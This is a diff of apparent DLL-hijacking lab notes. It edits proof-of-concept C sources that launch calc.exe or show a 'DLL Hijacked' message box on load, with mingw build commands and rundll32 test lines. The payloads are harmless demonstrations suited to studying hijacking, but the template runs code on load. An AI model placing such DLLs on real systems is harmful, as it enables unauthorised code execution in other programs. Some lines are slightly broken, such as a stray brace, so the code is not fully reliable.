@@ -44,46 +44,53 @@ in procmon:
 			
 ***************************************************************************
 Simple proof-of-concept DLL source code (compile on Kali):
---------------
 #Run Calculator
+--------------
 #include <windows.h>
-#define DLLIMPORT __declspec (dllexport)
 
-DLLIMPORT void hook_startup() { evil(); }
-
-int evil()
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 {
-  WinExec("calc", 0);
-  exit(0);
-  return 0;
+	switch (fdwReason)
+	{
+		case DLL_PROCESS_ATTACH:
+			WinExec("calc.exe", SW_SHOWNORMAL);
+			break;
+		case DLL_THREAD_ATTACH:
+		case DLL_THREAD_DETACH:
+		case DLL_PROCESS_DETACH:
+			break;
+	}
+	return TRUE;
 }
+
+__attribute__((dllexport)) void CALLBACK LaunchCalc(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
+{
+	WinExec("calc.exe", SW_SHOWNORMAL);
+}}
+
+32bit:
+c:\windows\SysWOW64\rundll32.exe hackjack4.dll,LaunchCalc
+
 
 DLL Message Box:
 ------------
 #include <windows.h>
 
-// 1. Define the function BEFORE calling it
-int dll_mll()
+__declspec(dllexport) void CALLBACK MsgBox(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
 {
-    // Note: Use MessageBoxA for plain strings or MessageBoxW for wide strings
-    MessageBoxA(NULL, "DLL Hijacked!", "DLL Message", MB_OK);
-    return 0; 
+        MessageBoxA(NULL, "DLL Hijacked via Export!", "DLL Message", MB_OK);
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 {
-    switch (fdwReason)
-    {
-        case DLL_PROCESS_ATTACH:
-            dll_mll();
-            break; // 2. Added break to prevent fall-through
-
-        case DLL_THREAD_ATTACH:
-        case DLL_THREAD_DETACH:
-        case DLL_PROCESS_DETACH:
-            break;
-    }
-    return TRUE;
+        switch (fdwReason)
+        {
+                case DLL_PROCESS_ATTACH:
+                        break;
+                default:
+                        break;
+        }
+        return TRUE;
 }
 
 ----------------
@@ -91,7 +98,8 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 Save above source code to hijack.c
 		
 complie on kali linux:
-	i686-w64-mingw32-gcc ./hijack.c -o hijack.dll -shared
+	i686-w64-mingw32-gcc ./hijack.c -o hijack.dll -shared -Wl,--kill-at
+		#-Wl,--kill-at strips symbols and such.
 
 Confirm the message box runs on windows by running:
 	c:\windows\SysWOW64\rundll32.exe hijack.dll MsgBox	#for 32 bit platforms
